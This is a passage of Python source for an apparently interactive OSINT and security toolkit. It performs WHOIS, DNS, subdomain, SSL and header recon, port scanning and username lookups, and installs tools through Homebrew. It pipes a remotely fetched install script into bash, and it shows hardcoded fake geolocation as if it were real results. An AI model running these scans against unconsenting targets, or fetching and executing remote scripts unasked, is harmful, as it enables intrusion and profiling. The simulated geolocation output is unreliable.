                            whois_data["expiration_date"] = value
                        elif "name server" in key:
                            if value and value.lower() != "none":
                                whois_data["name_servers"].append(value)
        else:
            # Fallback to HTTP-based WHOIS (simplified)
            import socket
            ip = socket.gethostbyname(domain)
            whois_data["ip_address"] = ip
    except Exception as e:
        print_error(f"WHOIS lookup error: {e}")

    return whois_data


def fetch_dns_records(domain):
    dns_data = {
        "A": [],
        "AAAA": [],
        "MX": [],
        "NS": [],
        "TXT": [],
        "CNAME": []
    }

    try:
        # A records
        try:
            import socket
            ip = socket.gethostbyname(domain)
            dns_data["A"].append(ip)
        except Exception:
            pass

        # Use dig if available for more record types
        if shutil.which("dig"):
            for record_type in dns_data.keys():
                result = run_command(["dig", "+short", domain, record_type], capture_output=True, check=False,
                                     timeout=5)

                if result.stdout:
                    for line in result.stdout.splitlines():
                        line = line.strip()
                        if line and line not in dns_data[record_type]:
                            dns_data[record_type].append(line)
    except Exception as e:
        print_error(f"DNS lookup error: {e}")

    # Remove empty record types
    dns_data = {k: v for k, v in dns_data.items() if v}

    return dns_data


def fetch_ssl_info(domain):
    ssl_data = {}

    try:
        import ssl
        import socket

        # Try to establish a secure connection
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()

                # Extract certificate information
                ssl_data["issuer"] = ", ".join([f"{k}={v}" for k, v in cert["issuer"][0]])
                ssl_data["subject"] = ", ".join([f"{k}={v}" for k, v in cert["subject"][0]])
                ssl_data["version"] = cert["version"]
                ssl_data["valid_from"] = cert["notBefore"]
                ssl_data["valid_until"] = cert["notAfter"]
                ssl_data["serial_number"] = cert["serialNumber"]

                # Add TLS version and cipher
                ssl_data["protocol"] = ssock.version()
                ssl_data["cipher"] = ssock.cipher()[0]
    except Exception:
        # Site might not support HTTPS or have SSL issues
        pass

    return ssl_data


def enumerate_subdomains(domain):
    subdomains = []

    try:
        if shutil.which("subfinder"):
            result = run_command(["subfinder", "-d", domain, "-silent"], capture_output=True, check=False, timeout=60)

            if result.stdout:
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line:
                        subdomains.append(line)

        # If no results or subfinder not available, try basic enumeration
        if not subdomains:
            # Common subdomains to check
            common_subdomains = ["www", "mail", "ftp", "webmail", "login", "admin", "shop",
                                 "blog", "dev", "api", "staging", "test", "portal", "cpanel"]

            for sub in common_subdomains:
                subdomain = f"{sub}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                    subdomains.append(subdomain)
                except socket.error:
                    pass
    except Exception as e:
        print_error(f"Subdomain enumeration error: {e}")

    return subdomains


def fetch_http_headers(domain):
    headers = {}

    try:
        # Try HTTP first
        url = f"http://{domain}"
        response = requests.head(url, timeout=5, allow_redirects=True)

        # If redirected to HTTPS, use that URL
        if response.url.startswith("https"):
            url = response.url
            response = requests.head(url, timeout=5)

        for header, value in response.headers.items():
            headers[header] = value
    except Exception:
        # Try HTTPS if HTTP failed
        try:
            url = f"https://{domain}"
            response = requests.head(url, timeout=5)

            for header, value in response.headers.items():
                headers[header] = value
        except Exception as e:
            print_error(f"HTTP header fetch error: {e}")

    return headers


def detect_technologies(domain):
    technologies = []

    try:
        # Try both HTTP and HTTPS
        for protocol in ["http", "https"]:
            try:
                url = f"{protocol}://{domain}"
                response = requests.get(url, timeout=5)

                # Check for common technologies based on headers and response content
                headers = response.headers
                html = response.text.lower()

                # Web servers
                if "server" in headers:
                    server = headers["server"]
                    technologies.append({"name": server, "category": "Web Server"})

                # Content Management Systems
                if "wordpress" in html:
                    technologies.append({"name": "WordPress", "category": "CMS"})
                elif "drupal" in html:
                    technologies.append({"name": "Drupal", "category": "CMS"})
                elif "joomla" in html:
                    technologies.append({"name": "Joomla", "category": "CMS"})

                # JavaScript frameworks
                if "react" in html or "reactjs" in html:
                    technologies.append({"name": "React", "category": "JavaScript Framework"})
                if "angular" in html:
                    technologies.append({"name": "Angular", "category": "JavaScript Framework"})
                if "vue" in html or "vuejs" in html:
                    technologies.append({"name": "Vue.js", "category": "JavaScript Framework"})

                # Analytics
                if "google analytics" in html or "ga.js" in html or "gtag" in html:
                    technologies.append({"name": "Google Analytics", "category": "Analytics"})

                # CDNs
                if "cloudflare" in headers.get("server", "").lower() or "cloudflare" in html:
                    technologies.append({"name": "Cloudflare", "category": "CDN/Security"})
                if "akamai" in headers.get("server", "").lower():
                    technologies.append({"name": "Akamai", "category": "CDN"})

                # E-commerce
                if "shopify" in html:
                    technologies.append({"name": "Shopify", "category": "E-commerce"})
                if "woocommerce" in html:
                    technologies.append({"name": "WooCommerce", "category": "E-commerce"})
                if "magento" in html:
                    technologies.append({"name": "Magento", "category": "E-commerce"})

                break  # Stop after successful request
            except Exception:
                continue
    except Exception as e:
        print_error(f"Technology detection error: {e}")

    return technologies


def ip_intelligence():
    ip = get_user_input("Enter IP address to investigate")
    if not ip:
        return

    # Validate IP address
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print_error("Invalid IP address")
        return

    results = {}

    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {ip}..."):
        # Geolocation (simulated)
        results["geolocation"] = {
            "country": "United States",
            "city": "Mountain View",
            "region": "California",
            "coordinates": "37.3861, -122.0839",
            "isp": "Google LLC",
            "timezone": "America/Los_Angeles"
        }

        # Reverse DNS
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            results["reverse_dns"] = hostname
        except (socket.herror, socket.gaierror):
            results["reverse_dns"] = "No PTR record found"

        # Port scan (sample ports)
        results["open_ports"] = {}
        common_ports = [21, 22, 23, 25, 80, 443, 3306, 8080]

        for port in common_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    results["open_ports"][port] = {"service": service, "state": "open"}
                s.close()
            except Exception:
                pass

    # Display results
    console.print()
    display_panel(
        "IP Intelligence Results",
        f"Target: {ip}",
        NordColors.FROST_2
    )

    if "geolocation" in results:
        geo_table = Table(
            title="Geolocation Information",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        geo_table.add_column("Field", style=f"bold {NordColors.FROST_2}")
        geo_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for field, value in results["geolocation"].items():
            geo_table.add_row(field.capitalize(), str(value))

        console.print(geo_table)

    if "reverse_dns" in results:
        console.print(f"[bold {NordColors.FROST_2}]Reverse DNS:[/] {results['reverse_dns']}")

    if results["open_ports"]:
        port_table = Table(
            title="Open Ports",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        port_table.add_column("Port", style=f"bold {NordColors.FROST_2}")
        port_table.add_column("Service", style=NordColors.SNOW_STORM_1)
        port_table.add_column("State", style=NordColors.GREEN)

        for port, info in sorted(results["open_ports"].items()):
            port_table.add_row(
                str(port),
                info.get("service", "unknown"),
                info.get("state", "unknown")
            )

        console.print(port_table)
    else:
        console.print("[bold]No open ports found[/]")

    # Save results
    if get_confirmation("Save intelligence results to file?"):
        osint_result = OSINTResult(
            target=ip,
            source_type="ip_intelligence",
            data=results
        )

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ip_intel_{ip.replace('.', '_')}_{timestamp}.json"
        save_result_to_file(osint_result, filename)


def email_intelligence():
    email = get_user_input("Enter email address to investigate")
    if not email:
        return

    # Basic email validation
    if "@" not in email or "." not in email.split("@")[1]:
        print_error("Invalid email address")
        return

    username, domain = email.split("@")

    results = {}

    with console.status(f"[bold {NordColors.FROST_2}]Gathering intelligence on {email}..."):
        # Domain information
        results["domain"] = fetch_domain_info(domain)

        # Check email validity (very basic)
        results["format_valid"] = bool(re.match(r"[^@]+@[^@]+\.[^@]+", email))

        # Check MX records
        mx_records = fetch_mx_records(domain)
        results["mx_records"] = mx_records

        # Check common email services
        mail_services = {
            "gmail.com": "Google Gmail",
            "yahoo.com": "Yahoo Mail",
            "outlook.com": "Microsoft Outlook",
            "hotmail.com": "Microsoft Hotmail",
            "aol.com": "AOL Mail",
            "protonmail.com": "ProtonMail",
            "icloud.com": "Apple iCloud",
            "zohomail.com": "Zoho Mail"
        }

        if domain in mail_services:
            results["email_service"] = mail_services[domain]
        else:
            results["email_service"] = "Custom/Business Email"

    # Display results
    console.print()
    display_panel(
        "Email Intelligence Results",
        f"Target: {email}",
        NordColors.FROST_2
    )

    email_table = Table(
        title="Email Analysis",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    email_table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    email_table.add_column("Value", style=NordColors.SNOW_STORM_1)

    email_table.add_row("Username", username)
    email_table.add_row("Domain", domain)
    email_table.add_row("Format Valid", "Yes" if results["format_valid"] else "No")
    email_table.add_row("Email Service", results["email_service"])

    console.print(email_table)

    if results["mx_records"]:
        mx_table = Table(
            title="MX Records",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        mx_table.add_column("Priority", style=f"bold {NordColors.FROST_2}")
        mx_table.add_column("Mail Server", style=NordColors.SNOW_STORM_1)

        for record in results["mx_records"]:
            mx_table.add_row(str(record["priority"]), record["host"])

        console.print(mx_table)
    else:
        console.print("[bold yellow]No MX records found. Email may not be valid.[/]")

    if "domain" in results and results["domain"]:
        domain_table = Table(
            title="Domain Information",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        domain_table.add_column("Property", style=f"bold {NordColors.FROST_2}")
        domain_table.add_column("Value", style=NordColors.SNOW_STORM_1)

        for key, value in results["domain"].items():
            if isinstance(value, list):
                value = ", ".join(value)
            domain_table.add_row(key.capitalize(), str(value))

        console.print(domain_table)

    # Save results
    if get_confirmation("Save intelligence results to file?"):
        osint_result = OSINTResult(
            target=email,
            source_type="email_intelligence",
            data=results
        )

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"email_intel_{email.replace('@', '_').replace('.', '_')}_{timestamp}.json"
        save_result_to_file(osint_result, filename)


def fetch_domain_info(domain):
    domain_info = {}

    try:
        # Get domain creation date and registrar (if available)
        if shutil.which("whois"):
            result = run_command(["whois", domain], capture_output=True, check=False, timeout=10)

            if result.stdout:
                for line in result.stdout.splitlines():
                    line = line.strip()

                    if ":" in line:
                        key, value = line.split(":", 1)
                        key = key.strip().lower()
                        value = value.strip()

                        if "registrar" in key and "registrar" not in domain_info:
                            domain_info["registrar"] = value
                        elif "created" in key and "creation_date" not in domain_info:
                            domain_info["creation_date"] = value

        # Check if website exists
        try:
            response = requests.get(f"http://{domain}", timeout=5)
            domain_info["website_exists"] = True
            domain_info["website_status_code"] = response.status_code
        except Exception:
            try:
                response = requests.get(f"https://{domain}", timeout=5)
                domain_info["website_exists"] = True
                domain_info["website_status_code"] = response.status_code
            except Exception:
                domain_info["website_exists"] = False
    except Exception as e:
        print_error(f"Domain info error: {e}")

    return domain_info


def fetch_mx_records(domain):
    mx_records = []

    try:
        if shutil.which("dig"):
            result = run_command(["dig", "+short", "MX", domain], capture_output=True, check=False, timeout=5)

            if result.stdout:
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line:
                        # MX records format: priority hostname
                        parts = line.split()
                        if len(parts) >= 2:
                            priority = int(parts[0])
                            host = " ".join(parts[1:])
                            mx_records.append({"priority": priority, "host": host})

        # Sort by priority
        mx_records.sort(key=lambda x: x["priority"])
    except Exception as e:
        print_error(f"MX records lookup error: {e}")

    return mx_records


def username_search():
    username = get_user_input("Enter username to search for")
    if not username:
        return

    # Define popular platforms
    platforms = [
        {"name": "Twitter", "url": f"https://twitter.com/{username}"},
        {"name": "GitHub", "url": f"https://github.com/{username}"},
        {"name": "Instagram", "url": f"https://www.instagram.com/{username}/"},
        {"name": "Facebook", "url": f"https://www.facebook.com/{username}"},
        {"name": "LinkedIn", "url": f"https://www.linkedin.com/in/{username}/"},
        {"name": "Reddit", "url": f"https://www.reddit.com/user/{username}"},
        {"name": "TikTok", "url": f"https://www.tiktok.com/@{username}"},
        {"name": "Pinterest", "url": f"https://www.pinterest.com/{username}/"},
        {"name": "YouTube", "url": f"https://www.youtube.com/user/{username}"}
    ]

    results = {}

    progress, task = display_progress(len(platforms), "Checking platforms", NordColors.FROST_2)

    with progress:
        for platform in platforms:
            time.sleep(0.3)  # Avoid rate limiting

            try:
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                response = requests.head(platform["url"], headers=headers, timeout=5, allow_redirects=True)

                # Check status code (200 OK usually means username exists)
                if response.status_code == 200:
                    results[platform["name"]] = {"found": True, "url": platform["url"]}
                else:
                    results[platform["name"]] = {"found": False, "url": platform["url"]}
            except Exception:
                results[platform["name"]] = {"found": False, "url": platform["url"]}

            progress.update(task, advance=1)

    # Display results
    console.print()
    display_panel(
        "Username Search Results",
        f"Username: {username}",
        NordColors.FROST_2
    )

    found_count = sum(1 for platform, info in results.items() if info["found"])

    username_table = Table(
        title=f"Found on {found_count} out of {len(platforms)} platforms",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    username_table.add_column("Platform", style=f"bold {NordColors.FROST_2}")
    username_table.add_column("Status", style=NordColors.SNOW_STORM_1)
    username_table.add_column("URL", style=NordColors.FROST_3)

    for platform, info in results.items():
        status = f"[bold {NordColors.GREEN}]● FOUND[/]" if info["found"] else f"[dim {NordColors.RED}]○ NOT FOUND[/]"
        username_table.add_row(platform, status, info["url"])

    console.print(username_table)

    # Save results
    if get_confirmation("Save search results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"username_search_{username}_{timestamp}.json"

        save_result_to_file(
            {"username": username, "results": results, "timestamp": datetime.datetime.now().isoformat()},
            filename
        )


def dns_reconnaissance():
    domain = get_user_input("Enter domain for DNS reconnaissance")
    if not domain:
        return

    record_types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA", "SRV", "PTR", "CAA"]

    console.print(f"[bold {NordColors.FROST_2}]Available record types:[/]")
    for i, record_type in enumerate(record_types, 1):
        console.print(f"  {i}. {record_type}")
    console.print(f"  {len(record_types) + 1}. All")

    type_choice = get_integer_input(f"Select record type (1-{len(record_types) + 1})", 1, len(record_types) + 1)
    if type_choice <= 0:
        return

    selected_types = []
    if type_choice <= len(record_types):
        selected_types = [record_types[type_choice - 1]]
    else:
        selected_types = record_types

    results = {}

    progress, task = display_progress(len(selected_types), "Querying DNS records", NordColors.FROST_2)

    with progress:
        for record_type in selected_types:
            if shutil.which("dig"):
                try:
                    cmd = ["dig", "+nocmd", "+noall", "+answer", "+multiline", domain, record_type]
                    result = run_command(cmd, capture_output=True, check=False, timeout=5)

                    if result.stdout:
                        records = []
                        for line in result.stdout.splitlines():
                            line = line.strip()
                            if line and not line.startswith(";"):
                                records.append(line)

                        if records:
                            results[record_type] = records
                except Exception:
                    pass

            # If dig failed or not available, try other methods for common record types
            if record_type not in results:
                try:
                    if record_type == "A":
                        ip = socket.gethostbyname(domain)
                        results[record_type] = [f"{domain}. IN A {ip}"]
                    elif record_type == "MX" and shutil.which("host"):
                        mx_cmd = ["host", "-t", "MX", domain]
                        mx_result = run_command(mx_cmd, capture_output=True, check=False, timeout=5)

                        if mx_result.stdout:
                            mx_records = []
                            for line in mx_result.stdout.splitlines():
                                if "mail is handled by" in line:
                                    mx_records.append(line)

                            if mx_records:
                                results[record_type] = mx_records
                except Exception:
                    pass

            progress.update(task, advance=1)

    # Display results
    console.print()
    display_panel(
        "DNS Reconnaissance Results",
        f"Domain: {domain}",
        NordColors.FROST_2
    )

    if results:
        for record_type, records in results.items():
            record_table = Table(
                title=f"{record_type} Records",
                show_header=True,
                header_style=f"bold {NordColors.FROST_1}",
            )
            record_table.add_column("Record", style=NordColors.SNOW_STORM_1)

            for record in records:
                record_table.add_row(record)

            console.print(record_table)
    else:
        console.print("[bold yellow]No DNS records found.[/]")

    # Save results
    if get_confirmation("Save reconnaissance results to file?"):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dns_recon_{domain.replace('.', '_')}_{timestamp}.json"

        save_result_to_file(
            {"domain": domain, "records": results, "timestamp": datetime.datetime.now().isoformat()},
            filename
        )


def tool_management_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Tool Management",
        "Install and manage security tools.",
        NordColors.FROST_4
    )

    options = [
        ("1", "Show Installed Tools", "View status of security tools"),
        ("2", "Install Tools", "Install missing security tools"),
        ("3", "Update Tools", "Update installed tools"),
        ("4", "Manage Homebrew", "Install and update Homebrew"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Tool Management Options", options))

    choice = get_integer_input("Select an option", 0, 4)
    if choice == 0:
        return
    elif choice == 1:
        show_installed_tools()
    elif choice == 2:
        install_tools()
    elif choice == 3:
        update_tools()
    elif choice == 4:
        manage_homebrew()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def show_installed_tools():
    console.print(f"[bold {NordColors.FROST_2}]Checking installed tools...[/]")

    # Group tools by category
    tools_by_category = {}
    for tool in SECURITY_TOOLS:
        category = tool.category
        if category not in tools_by_category:
            tools_by_category[category] = []

        tools_by_category[category].append(tool)

    # Check installation status
    tool_status = get_tool_status([tool.name for tool in SECURITY_TOOLS])

    # Display results by category
    for category, tools in tools_by_category.items():
        table = Table(
            title=f"{category.value.capitalize()} Tools",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("Tool", style=f"bold {NordColors.FROST_2}")
        table.add_column("Status", style=NordColors.SNOW_STORM_1)
        table.add_column("Description", style=NordColors.FROST_3)

        for tool in sorted(tools, key=lambda x: x.name):
            status = f"[bold {NordColors.GREEN}]● INSTALLED[/]" if tool_status.get(tool.name,
                                                                                   False) else f"[dim {NordColors.RED}]○ NOT INSTALLED[/]"
            table.add_row(tool.name, status, tool.description)

        console.print(table)

    # Summary
    installed_count = sum(1 for status in tool_status.values() if status)
    total_count = len(tool_status)

    display_panel(
        "Installation Summary",
        f"{installed_count} out of {total_count} tools installed ({installed_count / total_count * 100:.1f}%)",
        NordColors.FROST_4
    )


def install_tools():
    if not shutil.which("brew"):
        print_error("Homebrew is not installed. Please install it first.")
        if get_confirmation("Install Homebrew now?"):
            manage_homebrew()
        else:
            return

    # Check tools
    tool_status = get_tool_status([tool.name for tool in SECURITY_TOOLS])
    missing_tools = [tool for tool in SECURITY_TOOLS if not tool_status.get(tool.name, False)]

    if not missing_tools:
        display_panel(
            "Installation Status",
            "All tools are already installed!",
            NordColors.GREEN
        )
        return

    # Display missing tools
    table = Table(
        title="Missing Tools",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Tool", style=NordColors.SNOW_STORM_1)
    table.add_column("Category", style=NordColors.FROST_3)
    table.add_column("Description", style=NordColors.FROST_4)

    for i, tool in enumerate(missing_tools, 1):
        table.add_row(str(i), tool.name, tool.category.value.capitalize(), tool.description)

    console.print(table)

    # Installation options
    console.print(f"[bold {NordColors.FROST_2}]Installation options:[/]")
    console.print("  1. Install all missing tools")
    console.print("  2. Install selected tools")
    console.print("  3. Install tools by category")
    console.print("  0. Cancel")

    install_option = get_integer_input("Select installation option", 0, 3)

    tools_to_install = []

    if install_option == 0:
        return
    elif install_option == 1:
        tools_to_install = missing_tools
    elif install_option == 2:
        tool_selection = get_user_input("Enter tool numbers to install (comma-separated, e.g. 1,3,5)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in tool_selection.split(",")]
            tools_to_install = [missing_tools[i] for i in selected_indices if 0 <= i < len(missing_tools)]
        except ValueError:
            print_error("Invalid selection")
            return
    elif install_option == 3:
        categories = sorted(set(tool.category.value for tool in missing_tools))

        console.print(f"[bold {NordColors.FROST_2}]Tool categories:[/]")
        for i, category in enumerate(categories, 1):
            console.print(f"  {i}. {category.capitalize()}")

        cat_selection = get_user_input("Enter category numbers to install (comma-separated, e.g. 1,3)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in cat_selection.split(",")]
            selected_categories = [categories[i] for i in selected_indices if 0 <= i < len(categories)]
            tools_to_install = [tool for tool in missing_tools if tool.category.value in selected_categories]
        except ValueError:
            print_error("Invalid selection")
            return

    if not tools_to_install:
        print_error("No tools selected for installation")
        return

    # Confirm installation
    if not get_confirmation(f"Install {len(tools_to_install)} tools? This may take a while."):
        return

    # Install tools
    progress, task = display_progress(len(tools_to_install), "Installing tools", NordColors.FROST_4)

    installed = []
    failed = []

    with progress:
        for tool in tools_to_install:
            tool_name = tool.name
            progress.update(task, description=f"Installing {tool_name}...")

            try:
                if not tool.install_methods:
                    failed.append((tool_name, "No installation methods available"))
                    continue

                # Try each installation method until one works
                success = False
                error_messages = []

                for method, value in tool.install_methods:
                    try:
                        if method == InstallMethod.BREW:
                            cmd = ["brew", "install", value]
                            run_command(cmd, capture_output=True, check=True, timeout=300)
                            success = True
                            break
                        elif method == InstallMethod.BREW_CASK:
                            cmd = ["brew", "install", "--cask", value]
                            run_command(cmd, capture_output=True, check=True, timeout=300)
                            success = True
                            break
                        elif method == InstallMethod.CUSTOM:
                            # Split command string and run
                            cmd_parts = value.split()
                            run_command(cmd_parts, capture_output=True, check=True, timeout=300)
                            success = True
                            break
                        elif method == InstallMethod.PIP:
                            cmd = [sys.executable, "-m", "pip", "install", value]
                            run_command(cmd, capture_output=True, check=True, timeout=300)
                            success = True
                            break
                        elif method == InstallMethod.GIT:
                            # Clone to ~/.toolkit/git directory
                            git_dir = BASE_DIR / "git"
                            git_dir.mkdir(exist_ok=True)
                            repo_name = value.split("/")[-1].replace(".git", "")
                            cmd = ["git", "clone", value, str(git_dir / repo_name)]
                            run_command(cmd, capture_output=True, check=True, timeout=300)
                            success = True
                            break
                    except Exception as e:
                        error_messages.append(f"{method.value}: {str(e)}")

                # Run post-install commands if successful
                if success and tool.post_install:
                    for post_cmd in tool.post_install:
                        try:
                            subprocess.run(post_cmd, shell=True, check=False)
                        except Exception:
                            pass

                if success:
                    installed.append(tool_name)
                else:
                    failed.append((tool_name, "; ".join(error_messages)))
            except Exception as e:
                failed.append((tool_name, str(e)))
            finally:
                progress.update(task, advance=1)

    # Display results
    if installed:
        display_panel(
            "Installation Successful",
            f"Successfully installed {len(installed)} tools:\n" + ", ".join(installed),
            NordColors.GREEN
        )

    if failed:
        failed_table = Table(
            title="Installation Failed",
            show_header=True,
            header_style=f"bold {NordColors.RED}",
        )
        failed_table.add_column("Tool", style=f"bold {NordColors.FROST_2}")
        failed_table.add_column("Error", style=NordColors.RED)

        for tool, error in failed:
            failed_table.add_row(tool, error)

        console.print(failed_table)


def update_tools():
    if not shutil.which("brew"):
        print_error("Homebrew is not installed. Please install it first.")
        return

    if get_confirmation("Update Homebrew first?"):
        try:
            with console.status(f"[bold {NordColors.FROST_2}]Updating Homebrew...[/]"):
                run_command(["brew", "update"], capture_output=True, check=False, timeout=120)
            print_success("Homebrew updated")
        except Exception as e:
            print_error(f"Homebrew update failed: {e}")

    if get_confirmation("Update all installed Homebrew packages?"):
        try:
            with console.status(f"[bold {NordColors.FROST_2}]Updating packages... This may take a while.[/]"):
                result = run_command(["brew", "upgrade"], capture_output=True, check=False, timeout=600)

            if "already installed" in result.stdout:
                print_success("All packages are already up to date")
            else:
                print_success("Packages updated")
        except Exception as e:
            print_error(f"Package update failed: {e}")

    if get_confirmation("Update Python packages?"):
        try:
            packages = ["requests", "rich", "pyfiglet", "prompt_toolkit", "scapy"]

            for package in packages:
                with console.status(f"[bold {NordColors.FROST_2}]Updating {package}...[/]"):
                    run_command([sys.executable, "-m", "pip", "install", "--upgrade", package],
                                capture_output=True, check=False, timeout=60)

            print_success("Python packages updated")
        except Exception as e:
            print_error(f"Python package update failed: {e}")


def manage_homebrew():
    if shutil.which("brew"):
        display_panel(
            "Homebrew Status",
            "Homebrew is already installed.",
            NordColors.GREEN
        )

        options = [
            ("1", "Update Homebrew", "Update Homebrew package managers"),
            ("2", "Upgrade All Packages", "Upgrade all installed packages"),
            ("3", "Cleanup", "Remove old versions and cache"),
            ("0", "Return", "Return to Tool Management")
        ]

        console.print(create_menu_table("Homebrew Management", options))

        choice = get_integer_input("Select an option", 0, 3)

        if choice == 0:
            return
        elif choice == 1:
            try:
                with console.status(f"[bold {NordColors.FROST_2}]Updating Homebrew...[/]"):
                    run_command(["brew", "update"], capture_output=True, check=False, timeout=120)
                print_success("Homebrew updated")
            except Exception as e:
                print_error(f"Homebrew update failed: {e}")
        elif choice == 2:
            try:
                with console.status(f"[bold {NordColors.FROST_2}]Upgrading packages... This may take a while.[/]"):
                    run_command(["brew", "upgrade"], capture_output=True, check=False, timeout=600)
                print_success("Packages upgraded")
            except Exception as e:
                print_error(f"Package upgrade failed: {e}")
        elif choice == 3:
            try:
                with console.status(f"[bold {NordColors.FROST_2}]Cleaning up Homebrew...[/]"):
                    run_command(["brew", "cleanup"], capture_output=True, check=False, timeout=120)
                print_success("Homebrew cleanup completed")
            except Exception as e:
                print_error(f"Homebrew cleanup failed: {e}")
    else:
        display_panel(
            "Homebrew Status",
            "Homebrew is not installed. Homebrew is required to install most security tools.",
            NordColors.RED
        )

        if get_confirmation("Install Homebrew now?"):
            homebrew_url = "https://raw.githubusercontent.com/Homebrew/install/master/install.sh"

            try:
                with console.status(f"[bold {NordColors.FROST_2}]Installing Homebrew... This may take a while.[/]"):
                    subprocess.run("/bin/bash -c \"$(curl -fsSL " + homebrew_url + ")\"",
                                   shell=True, check=True)
                print_success("Homebrew installed successfully")
            except Exception as e:
                print_error(f"Homebrew installation failed: {e}")
                print_info("Visit https://brew.sh for manual installation instructions")


def settings_module():
    console.clear()
    console.print(create_header())
    display_panel(
        "Settings",
        "Configure application settings and options.",
        NordColors.FROST_4
    )

    options = [
        ("1", "Configuration", "Modify application configuration"),
        ("2", "Manage Results", "View, export, or delete results"),
        ("3", "Manage Payloads", "View, export, or delete payloads"),
        ("4", "Manage Wordlists", "Add, edit, or delete wordlists"),
        ("5", "System Information", "View system information"),
        ("0", "Return", "Return to Main Menu")
    ]

    console.print(create_menu_table("Settings Options", options))

    choice = get_integer_input("Select an option", 0, 5)
    if choice == 0:
        return
    elif choice == 1:
        manage_configuration()
    elif choice == 2:
        manage_results()
    elif choice == 3:
        manage_payloads()
    elif choice == 4:
        manage_wordlists()
    elif choice == 5:
        system_information()

    input(f"\n[{NordColors.FROST_2}]Press Enter to continue...[/]")


def manage_configuration():
    config = load_config()

    console.print()
    table = Table(
        title="Current Configuration",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("Setting", style=f"bold {NordColors.FROST_2}")
    table.add_column("Value", style=NordColors.SNOW_STORM_1)

    for key, value in config.items():
        if isinstance(value, list):
            value = ", ".join(value)
        table.add_row(key.replace("_", " ").title(), str(value))

    console.print(table)

    options = [
        ("1", "Change Default Threads", f"Current: {config.get('threads', DEFAULT_THREADS)}"),
        ("2", "Change Default Timeout", f"Current: {config.get('timeout', DEFAULT_TIMEOUT)}"),
        ("3", "Change User Agent", f"Current: {config.get('user_agent', 'Default')}"),
        ("4", "Reset to Defaults", "Restore default configuration"),
        ("0", "Return", "Return to Settings")
    ]

    console.print(create_menu_table("Configuration Options", options))

    choice = get_integer_input("Select an option", 0, 4)

    if choice == 0:
        return
    elif choice == 1:
        threads = get_integer_input("Enter default threads (1-50)", 1, 50)
        if threads > 0:
            config["threads"] = threads
            save_config(config)
            print_success(f"Default threads set to {threads}")
    elif choice == 2:
        timeout = get_integer_input("Enter default timeout in seconds (1-300)", 1, 300)
        if timeout > 0:
            config["timeout"] = timeout
            save_config(config)
            print_success(f"Default timeout set to {timeout} seconds")
    elif choice == 3:
        console.print("Available user agents:")
        for i, agent in enumerate(USER_AGENTS, 1):
            console.print(f"  {i}. {agent}")
        console.print(f"  {len(USER_AGENTS) + 1}. Custom")

        agent_choice = get_integer_input(f"Select user agent (1-{len(USER_AGENTS) + 1})", 1, len(USER_AGENTS) + 1)

        if agent_choice > 0:
            if agent_choice <= len(USER_AGENTS):
                config["user_agent"] = USER_AGENTS[agent_choice - 1]
            else:
                custom_agent = get_user_input("Enter custom user agent")
                if custom_agent:
                    config["user_agent"] = custom_agent

            save_config(config)
            print_success("User agent updated")
    elif choice == 4:
        if get_confirmation("Reset all settings to default values?"):
            default_config = {
                "threads": DEFAULT_THREADS,
                "timeout": DEFAULT_TIMEOUT,
                "user_agent": random.choice(USER_AGENTS),
            }

            save_config(default_config)
            print_success("Settings reset to defaults")


def load_config():
    config_file = CONFIG_DIR / "config.json"
    default = {
        "threads": DEFAULT_THREADS,
        "timeout": DEFAULT_TIMEOUT,
        "user_agent": random.choice(USER_AGENTS),
    }

    if not config_file.exists():
        with open(config_file, "w") as f:
            json.dump(default, f, indent=2)
        return default

    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except Exception as e:
        print_error(f"Error loading config: {e}")
        return default


def save_config(config):
    config_file = CONFIG_DIR / "config.json"
    try:
        with open(config_file, "w") as f:
            json.dump(config, f, indent=2)
        return True
    except Exception as e:
        print_error(f"Error saving config: {e}")
        return False


def manage_results():
    results_files = list(RESULTS_DIR.glob("*.json")) + list(RESULTS_DIR.glob("*.txt"))

    if not results_files:
        display_panel(
            "Results Management",
            "No results found. Run some scans or reconnaissance first.",
            NordColors.YELLOW
        )
        return

    # Group by type
    result_types = {}
    for file in results_files:
        prefix = file.name.split('_')[0]
        if prefix not in result_types:
            result_types[prefix] = []
        result_types[prefix].append(file)

    # Sort types by number of files
    sorted_types = sorted(result_types.items(), key=lambda x: len(x[1]), reverse=True)

    options = [
        ("1", "View Results by Type", "Browse results organized by type"),
        ("2", "Search Results", "Search for specific results"),
